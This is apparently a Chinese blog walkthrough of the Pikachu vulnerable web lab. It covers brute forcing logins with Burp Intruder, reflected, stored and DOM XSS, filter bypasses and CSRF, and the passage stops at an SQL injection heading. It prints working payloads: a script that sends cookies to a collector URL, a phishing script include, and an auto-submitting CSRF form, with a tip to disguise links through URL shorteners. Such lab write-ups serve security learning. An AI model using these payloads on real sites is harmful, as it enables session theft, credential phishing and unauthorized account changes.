    <content type="html"><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对暴力破解无任何防护</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用Burpsuite抓包后将数据发送到Intrude模块中，将passowrd字段设置为变量<br>再将密码包导入，点击Start attack开始爆破，等待爆破结束后对比返回数据长度，与其他不同的就是密码了<br><img src="/CTF/1.png"></p><h2 id="基于表单的暴力破解-1"><a href="#基于表单的暴力破解-1" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><h3 id="防御方式-1"><a href="#防御方式-1" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别通过验证码的方式在服务器上对用户输入的验证码进行判断</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过抓包将数据发送到Repeater模块后点击Run放行数据，可以看到返回的页面提示用户名或密码错误<br>将Repeater模块中password字段修改为其他字符，再次提交可以发现提示的信息还是用户名或密码错误，而不是验证码错误，可以判断该验证码一直有效<br>再参考上面的基于表单爆破进行尝试<br><img src="/CTF/2.png"></p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><h3 id="防御方式-2"><a href="#防御方式-2" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别通过验证码的方式在客户端上对用户输入的验证码进行判断</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>方法1: 同上<br><img src="/CTF/3.png"><br>方法2: 使用浏览器将JS禁用掉之后就不用输入验证码了，再去使用Burpsuite爆破即可</p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><h3 id="防御方式-3"><a href="#防御方式-3" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别在每次登录中都会携带不同的token，只有token正确才能进行登录，否则就显示 csrf token error</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用Burpsuite抓包后将该数据发送到Intruder模块中，将password与user_token字段添加为变量</p><p>将攻击类型Attack type设置为Pitchfork<br><img src="/CTF/4.png"></p><p>在Options下的Grep-Extract中点击Add添加攻击需要用到的信息(user_token)</p><p>在该页面点击Fetch response后在返回的代码中找到user_token的值，并将其选中后复制(后续需要用到)<br><img src="/CTF/5.png"></p><p>在Options下的Request Engine请求线程数设置为1<br><img src="/CTF/6.png"></p><p>选中Payload set 1 ，将Payload type 设置为Simple list<br><img src="/CTF/7.png"></p><p>选中Payload set 2 ，将Payload type设置为Recursive grep</p><p>将刚才复制的user_token值设置为第一次请求的user_token值<br><img src="/CTF/8.png"></p><p>开始攻击后会自动从网页中获取下一次的user_token值，并将该值携带到下一次请求中</p><p>如果在配置过程中出现错误需要重新抓包发送到Intruder模块中，重复上面的操作</p><p>发现有长度不一样的相应数据包，查看发现爆破成功，payload1处即为密码：<br><img src="/CTF/9.png"></p><h1 id="XSS漏洞-Cross-Site-Scripting"><a href="#XSS漏洞-Cross-Site-Scripting" class="headerlink" title="XSS漏洞(Cross-Site Scripting)"></a>XSS漏洞(Cross-Site Scripting)</h1><h2 id="反射型-get"><a href="#反射型-get" class="headerlink" title="反射型(get)"></a>反射型(get)</h2><h3 id="防御方式-4"><a href="#防御方式-4" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?message=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&amp;submit=submit</span><br></pre></td></tr></table></figure><p>突破一下输入长度<br><img src="/CTF/10.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">进行xss（get）攻击，输入框输入?message=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="/CTF/11.png"></p><h2 id="反射型-post"><a href="#反射型-post" class="headerlink" title="反射型(post)"></a>反射型(post)</h2><h3 id="防御方式-5"><a href="#防御方式-5" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用提示的账号密码(admin|123456)登录后再编辑框中输入Payload测试</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/CTF/11.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;# 弹<span class="title class_">Cookie</span></span><br></pre></td></tr></table></figure><p><img src="/CTF/12.png"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="防御方式-6"><a href="#防御方式-6" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">array_key_exists</span>(<span class="string">&#x27;id&#x27;</span>, $_GET) &amp;&amp; <span class="title function_">is_numeric</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入</span></span><br><span class="line">    $query=<span class="string">&quot;delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;</span>;</span><br><span class="line">    $result=<span class="title function_">execute</span>($link, $query);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">mysqli_affected_rows</span>($link)==<span class="number">1</span>)&#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;document.location.href=&#x27;xss_stored.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $html.=<span class="string">&quot;&lt;p id=&#x27;op_notice&#x27;&gt;删除失败,请重试并检查数据库是否还好!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>存储型将留言的内容写入到数据库后，当用户访问该页面就会触发该漏洞</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/CTF/13.png"><br><img src="/CTF/11.png"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h3 id="防御方式-7"><a href="#防御方式-7" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接插入测试的Payload后页面并不会弹窗，观察前端代码发现Payload被包含在a标签的href属性中</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#正常情况下</span><br><span class="line">&lt;div id=<span class="string">&quot;dom&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>可以使用单引号闭合跃出,onclick属性执行弹窗命令，点击超链接触发</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#插入<span class="title class_">Payload</span>:</span><br><span class="line"><span class="string">&#x27;onclick=alert(&quot;xss&quot;)&gt; </span></span><br><span class="line"><span class="string">（插入这句就行了，下面的“做远远让人听见的风”是把它当成超链接，也是去往下一级的目录名称，</span></span><br><span class="line"><span class="string">然后再执行后面的触发事件）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#插入Payload后（做远远让人听见的风&#x27;</span>onclick=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;）</span><br><span class="line">&lt;a href=<span class="string">&quot;做远远让人听见的风&quot;</span> onclick=<span class="string">&quot;alert(&quot;</span>xss<span class="string">&quot;)&quot;</span>&gt;<span class="string">&#x27;&gt;what do you see?&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/CTF/14.1.png"><br><img src="/CTF/14.png"><br><img src="/CTF/15.png"></p><h2 id="DOM型XSS-x"><a href="#DOM型XSS-x" class="headerlink" title="DOM型XSS-x"></a>DOM型XSS-x</h2><h3 id="防御方式-8"><a href="#防御方式-8" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>与上面的方法一样，可以使用onclick属性执行弹窗命令，点击超链接触发</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><p><img src="/CTF/16.png"></p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><h3 id="防御方式-9"><a href="#防御方式-9" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>盲打不是一种漏洞类型，而是一种攻击场景</p><p>在留言框或姓名中插入Payload测试，根据提示登录到后台查看留言的信息，直接触发XSS</p><p>管理员查看留言板后台的地址：&#x2F;vul&#x2F;xss&#x2F;xssblind&#x2F;admin_login.php<br>管理员账号密码admin | 123456</p><p><img src="/CTF/17.png"></p><p>获取管理员Cookie</p><p>使用Pikachu自带的XSS平台构造Payload，获取管理员登录的Cookie</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1/pikachu-master/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/CTF/18.png"></p><p>然后管理员登录了之后，会看到这个<br><img src="/CTF/19.png"><br>说明成功了。<br>再去pikachu xss获取cookies结果页面查看：<a href="http://localhost/pikachu-master/pkxss/xcookie/pkxss_cookie_result.php">http://localhost/pikachu-master/pkxss/xcookie/pkxss_cookie_result.php</a><br><img src="/CTF/20.png"></p><p>钓鱼攻击</p><p>需要先修改配置文件pkxss&#x2F;xfish&#x2F;fish.php<br>&#x2F;&#x2F; 将下方的地址改为你的IP地址 </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">header(&quot;Location: http://192.168.132.200:8000/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;</span><br><span class="line">#我这里改成（http://127.0.0.1/pikachu-master/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;）</span><br></pre></td></tr></table></figure><p><img src="/CTF/21.png"></p><p>改完之后，便做好了最基本的配置工作。</p><p>打开存储型xss（记住只有这个可以成功）</p><p>再将下方的Payload插入到留言板中，等用户访问留言板时会弹出认证的窗口，输入账号密码后就会发送到后台中</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># Payload</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/pikachu-master/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/CTF/22.png"><br><img src="/CTF/23.png"></p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><h3 id="防御方式-10"><a href="#防御方式-10" class="headerlink" title="防御方式"></a>防御方式</h3><p>过滤掉了<code>&lt;script</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$message</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(xss)<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 使用其他的Payload</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><h3 id="防御方式-11"><a href="#防御方式-11" class="headerlink" title="防御方式"></a>防御方式</h3><p>将一些字符都转换为实体标签，如&lt; 转换为&lt;</p><h3 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>htmlspecialchars() 是PHP里面把预定义的字符转换为HTML实体的函数，被转换的字符如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 插入下方字符时</span><br><span class="line">&quot;&lt;&#x27;&gt;#?</span><br><span class="line"></span><br><span class="line"># 被转换后的代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>&lt;&quot;</span> &amp;<span class="attr">gt</span>;#?&#x27;=<span class="string">&quot;&quot;</span>&gt;</span>&quot;<span class="symbol">&amp;lt;</span>&#x27;<span class="symbol">&amp;gt;</span>#?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据上方返回的信息可以看到字符 “ &lt; &gt;都被转换成了HTML实体函数，但字符’并未被转化(默认不对’进行处理)</p><p>插入的字符都会被包裹在a标签的href属性里，可以使用onclick属性执行弹窗命令</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 正常代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Payload</span><br><span class="line">&#x27; onclick=alert(/xss/) &#x27;        # 前后的&#x27;用于闭合a标签的href属性</span><br><span class="line"></span><br><span class="line"># 插入Payload后</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span> &#x27;&#x27;=<span class="string">&quot;&quot;</span>&gt;</span>&#x27; onclick=alert(/xss/) &#x27;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><h3 id="防御方式-12"><a href="#防御方式-12" class="headerlink" title="防御方式"></a>防御方式</h3><p>如果输出的信息为<a href="http://www.baidu.com时则正常输出,反之则将输入的值使用htmlspecialchars()函数进行转换/">www.baidu.com时则正常输出，反之则将输入的值使用htmlspecialchars()函数进行转换</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据源码中的提示可以使用javascript协议来执行js，当点击超链接时会执行该js脚本实现弹窗</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(/test/)</span><br><span class="line"></span><br><span class="line"># 前端代码如下</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&quot;</span><span class="attr">xss</span>&quot;)&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><h3 id="防御方式-13"><a href="#防御方式-13" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当在编辑框中输入Hello时网页的JS代码如下显示，输入的值被包含在变量ms中</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $ms=<span class="string">&#x27;Hello&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//            alert($ms);</span></span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过上方代码构造如下Payload，第一个</script>标签用于闭合上面的标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 闭合后的前端代码如下</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    $ms=&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>       # 这里的script被执行了</span><br><span class="line">&#x27;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &#x27;tmac&#x27;)&#123;</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF（GET）"><a href="#CSRF（GET）" class="headerlink" title="CSRF（GET）"></a>CSRF（GET）</h2><h3 id="防御方式-14"><a href="#防御方式-14" class="headerlink" title="防御方式"></a>防御方式</h3><p>无</p><h3 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据提示中的账号密码登录账号后，在修改个人信息页面将信息进行修改抓包分析</p><p>可以看到修改资料的请求使用GET直接发送的<br><img src="/CTF/24.png"><br>在vince登录状态下（其实这个链接里面是不包含用户名的，谁登录都无所谓，只要有人登录着就行，登录着的用户的信息就会被改成url提供的那些），试试改一改上面的链接，比如把电话号码改一改。然后用Burp进行重放，或者直接用浏览器地址栏输入Payload。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=12345qq5&amp;add=123qq132&amp;email=1232131&amp;submit=submit</span><br></pre></td></tr></table></figure><p>构造如上Payload后，当用户使用同一个浏览器访问构造的URL后浏览器就会携带网站的Cookie，并自动提交表单中预设的个人信息，导致个人信息被修改。</p><p>如果觉得这个url过于明显，网上有很多短链接网站可以修饰url（百度搜索“短链接”就有很多）<br><img src="/CTF/25.png"></p><h2 id="CSRF（POST）"><a href="#CSRF（POST）" class="headerlink" title="CSRF（POST）"></a>CSRF（POST）</h2><h3 id="防御方式-15"><a href="#防御方式-15" class="headerlink" title="防御方式"></a>防御方式</h3><p>无</p><h3 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>与GET提交类似，通过抓包可以看到POST提交的输入如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=%E7%94%B7&amp;phonenum=123&amp;add=456&amp;email=789&amp;submit=submit</span><br></pre></td></tr></table></figure><p>构造如下Payload后，当用户使用同一个浏览器访问构造的URL后浏览器就会携带网站的Cookie，并自动提交表单中预设的个人信息，导致个人信息被修改</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;giao&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123654789&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;giao&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;giao&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在攻击者的电脑cmd命令开启http服务<br>python -m http.server 80<br>创建文件post.html放在桌面，写入payload，在桌面打开cmd，输入python -m http.server 80<br>然后将链接：<a href="http://localhost:8000/post.html%E5%8F%91%E9%80%81%E7%BB%99%E8%A2%AB%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E8%A2%AB%E6%94%BB%E5%87%BB%E8%80%85%E6%89%93%E5%BC%80%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%BF%A1%E6%81%AF%E5%B0%B1%E4%BC%9A%E8%A2%AB%E4%BF%AE%E6%94%B9%E3%80%82">http://localhost:8000/post.html发送给被攻击者，被攻击者打开链接，信息就会被修改。</a><br><img src="/CTF/26.png"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><h3 id="防御方式-16"><a href="#防御方式-16" class="headerlink" title="防御方式"></a>防御方式</h3><p>当修改信息时需要校验网页中的token信息，token信息都时随机生成的，且每次修改资料token值都会发生改变，该机制暂时无法绕过(无法知晓前端Token值)</p><h3 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>暂无<br><img src="/CTF/27.png"><br>试了一下，这关删除token是无法修改用户信息的，多抓几个包之后也没有看出token有什么规律。</p><p>在一个浏览器上以lucy登录，到修改信息的页面，查看网页源代码获取token，再到另一个浏览器以lili登录，构造payload包含此token也是无法攻击成功的。</p><p>看一下代码，修改用户信息时，服务器会比较url中的token字段和session中的token字段，如果相同才能修改用户信息。</p><p>修改完用户信息之后，会用set_token()函数生成新的token，将其返回到html表单中并隐藏起来，以便下次用户修改信息时代入url。<br><img src="/CTF/28.png"><br><img src="/CTF/29.png"><br>set_token()函数如下图所示，在生成新token之前会先销毁老token，避免token重复使用。<br><img src="/CTF/30.png"></p><h1 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h1><h2 id="注入常用套路"><a href="#注入常用套路" 